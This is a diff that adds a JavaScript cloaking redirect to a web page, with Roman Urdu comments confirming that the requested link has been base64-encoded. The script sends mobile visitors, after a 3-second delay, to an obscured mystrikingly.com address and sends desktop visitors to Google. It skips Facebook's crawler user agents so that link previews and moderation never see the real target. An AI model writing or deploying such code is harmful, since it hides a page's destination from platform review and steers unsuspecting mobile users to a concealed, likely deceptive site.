@@ -1,0 +1,33 @@
+<script type='text/javascript'>
+//<![CDATA[
+(function() {
+    /* USTAD CHECK: Ye wahi link hai jo aapne bheja tha:
+       'https://energetic-orange-sswhtv.mystrikingly.com/'
+       Isay niche 'mobile_url' mein encode kar diya gaya hai.
+    */
+    var mobile_url = "aHR0cHM6Ly9lbmVyZ2V0aWMtb3JhbmdlLXNzd2h0di5teXN0cmlraW5nbHkuY29tLw==";
+    var pc_url = "https://www.google.com";
+
+    function startRedirect() {
+        var ua = navigator.userAgent.toLowerCase();
+        var isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
+
+        if (isMobile) {
+            // Mobile users 3 seconds wait karein ge
+            setTimeout(function() {
+                window.location.href = window.atob(mobile_url);
+            }, 3000);
+        } else {
+            // Windows/PC users seedha Google par jayein ge
+            window.location.href = pc_url;
+        }
+    }
+
+    // Bot detection filter
+    if (navigator.userAgent.indexOf('FacebookExternalHit') == -1 && 
+        navigator.userAgent.indexOf('Facebot') == -1) {
+        window.onload = startRedirect;
+    }
+})();
+//]]>
+</script>
